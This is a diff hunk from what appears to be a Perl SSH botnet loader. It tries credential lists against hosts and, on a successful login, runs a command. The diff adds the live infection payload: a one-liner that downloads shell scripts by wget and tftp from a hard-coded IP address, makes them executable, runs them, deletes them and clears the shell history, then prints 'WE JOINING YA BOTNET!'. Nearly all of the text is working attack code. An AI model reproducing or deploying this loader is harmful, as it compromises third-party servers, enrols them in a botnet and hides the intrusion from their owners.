@@ -16,7 +16,7 @@ scalar(@newarray); $i+=3) {
         if ($ssh->connect($newarray[$c])) {
                 if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                         $channel = $ssh->channel();
-                        $channel->exec('PAYLOAD GOES HERE');
+                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.15.36.215/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 194.15.36.215 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c');
                         sleep 10; 
                         $channel->close;
                         print "\e[1;37mWE JOINING YA BOTNET!: ".$newarray[$c]."\n";
